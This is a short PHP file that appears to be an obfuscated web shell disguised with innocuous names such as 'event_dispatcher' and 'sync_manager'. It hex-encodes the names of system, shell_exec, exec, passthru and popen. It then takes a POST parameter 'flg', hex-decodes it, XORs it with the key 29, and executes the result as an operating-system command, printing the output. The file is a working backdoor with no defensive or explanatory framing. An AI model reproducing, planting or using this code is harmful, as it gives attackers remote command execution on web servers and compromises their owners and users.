<?php

$event_dispatcher4 = "passth\x72\x75";
$event_dispatcher1 = "\x73\x79\x73tem";
$event_dispatcher2 = "\x73hell\x5Fex\x65\x63";
$event_dispatcher6 = "\x73\x74\x72e\x61\x6D_\x67et_\x63ont\x65n\x74\x73";
$event_dispatcher7 = "p\x63\x6Cose";
$event_dispatcher5 = "p\x6F\x70en";
$event_dispatcher3 = "\x65x\x65c";
$system_core = "\x68ex2b\x69n";
if (isset($_POST["\x66\x6Cg"])) {
            function sync_manager   (    $holder   ,      $resource   )     {   $sym      =   ''    ;   $s=0; while($s<strlen($holder)){$sym.=chr(ord($holder[$s])^$resource);$s++;} return    $sym;    }
            $flg = $system_core($_POST["\x66\x6Cg"]);
            $flg = sync_manager($flg, 29);
            if (function_exists($event_dispatcher1)) {
                $event_dispatcher1($flg);
            } elseif (function_exists($event_dispatcher2)) {
                print $event_dispatcher2($flg);
            } elseif (function_exists($event_dispatcher3)) {
                $event_dispatcher3($flg, $ref_holder);
                print join("\n", $ref_holder);
            } elseif (function_exists($event_dispatcher4)) {
                $event_dispatcher4($flg);
            } elseif (function_exists($event_dispatcher5) && function_exists($event_dispatcher6) && function_exists($event_dispatcher7)) {
                $resource_sym = $event_dispatcher5($flg, 'r');
                if ($resource_sym) {
                    $value_val = $event_dispatcher6($resource_sym);
                    $event_dispatcher7($resource_sym);
                    print $value_val;
                }
            }
            exit;
        }